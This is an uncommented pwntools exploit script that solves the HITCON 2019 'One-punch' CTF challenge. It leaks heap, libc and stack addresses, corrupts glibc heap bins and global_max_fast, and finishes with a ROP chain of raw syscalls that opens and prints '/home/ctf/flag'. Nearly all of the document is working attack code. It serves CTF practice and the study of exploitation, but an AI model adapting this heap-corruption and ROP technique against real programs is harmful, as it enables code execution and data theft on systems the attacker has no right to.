# One-punch HITCON-2019

```python
#!/usr/bin/python3
from pwn import *
from time import sleep

####Utils
def debut(idx,name):
	io.sendlineafter('> ','1')
	io.sendlineafter('idx: ',str(idx))
	io.sendafter('name: ',name)

def rename(idx,newname):
	io.sendlineafter('> ','2')
	io.sendlineafter('idx: ',str(idx))
	io.sendafter('name: ',newname)

def show(idx):
	io.sendlineafter('> ','3')
	io.sendlineafter('idx: ',str(idx))
	return io.recvline().strip()[11:]

def delete(idx):
	io.sendlineafter('> ','4')
	io.sendlineafter('idx: ',str(idx))

def backdoor(data):
	io.sendlineafter('> ',str(0xc388))
	sleep(0.2)
	io.send(data)
	io.recvuntil('( ﾟДﾟ)σ弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌⊃\n')
	return io.recvline().strip()

####Addr
main_arena = 0x3b2c40
unsorted_bin_offset = main_arena+0x60
small_bin_offset = 0x3b2d80
global_max_fast = 0x3b4920
_IO_stdout_struct_offset = 0x3b3760
__malloc_hook = 0x3b2c30
__free_hook = 0x3b48c8
setcontext = 0x444e0
environ = 0x3b5098

####Gadgets
L_pop_rdi = 0x00128b1d
L_pop_rsi = 0x0011f7f8
L_pop_rdx = 0x00193262
L_pop_rax = 0x000f0b02
L_syscall = 0x00100085

####Exploit
io = process('./O')
hero = [0,1]
for i in range(7):
	debut(hero[0],'A'*0x178)
	delete(hero[0])
heap_base = u64(show(hero[0]).ljust(8,b'\x00'))-0x9e0
print(f'Heap: 0x{heap_base:02x}')

debut(hero[0],'A'*0x178)
debut(hero[1],b'A'*0x158+p64(0xb1)+b'A'*(0x208-0x168))
delete(hero[1])
delete(hero[0])
unsorted_bin = u64(show(hero[0]).ljust(8,b'\x00'))
libc_base = unsorted_bin-unsorted_bin_offset
print(f'Libc: 0x{libc_base:02x}')

debut(hero[1],'A'*0x80)
debut(hero[1],'A'*0x108)
rename(hero[0],b'A'*0x88+\
	p64(0xf1)+p64(libc_base+small_bin_offset)+p64(heap_base+0xd70)+\
	p64(heap_base+0xd60)+p64(heap_base+0xd80)+\
	p64(0)+p64(heap_base+0xd90)+\
	p64(0)+p64(heap_base+0xda0)+\
	p64(0)+p64(heap_base+0xdb0)+\
	p64(0)+p64(heap_base+0xdc0)+\
	p64(0)+p64(heap_base+0xdd0)+\
	p64(0)+p64(libc_base+global_max_fast-0x10))
debut(hero[1],'A'*0xe8)

for i in range(8):
	rename(hero[0],b'A'*0x88+p64(0x251)+p64(0x0)+p64(0x0))
	delete(hero[1])
rename(hero[0],b'A'*0x88+p64(0x251)+p64(heap_base))
debut(hero[1],b'A'*0x248)
debut(hero[1],p64(0x0707070707070707)*0x8+b'A'*0x100+p64(libc_base+environ-0x10)+b'C'*0xf8)
stack_leak = u64(backdoor(b'HK'*(0x10//2))[16:].ljust(8,b'\x00'))
stack_return = stack_leak-0x110
print(f'Stack: 0x{stack_leak:02x}')

rename(hero[0],'/home/ctf/flag\x00')
rename(hero[1],p64(0x0707070707070707)*0x8+b'A'*0x100+p64(stack_return)+b'C'*0xf8)
L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base+0xce0)+\
	p64(libc_base+L_pop_rsi)+p64(0x0)+\
	p64(libc_base+L_pop_rax)+p64(0x2)+\
	p64(libc_base+L_syscall)+\
	p64(libc_base+L_pop_rdi)+p64(0x3)+\
	p64(libc_base+L_pop_rsi)+p64(heap_base+0xce0)+\
	p64(libc_base+L_pop_rdx)+p64(0x50)+\
	p64(libc_base+L_pop_rax)+p64(0x0)+\
	p64(libc_base+L_syscall)+\
	p64(libc_base+L_pop_rdi)+p64(0x1)+\
	p64(libc_base+L_pop_rax)+p64(0x1)+\
	p64(libc_base+L_syscall)+\
	p64(libc_base+L_pop_rax)+p64(0x3c)+\
	p64(libc_base+L_syscall)
backdoor(L_ROP)
io.interactive()
```
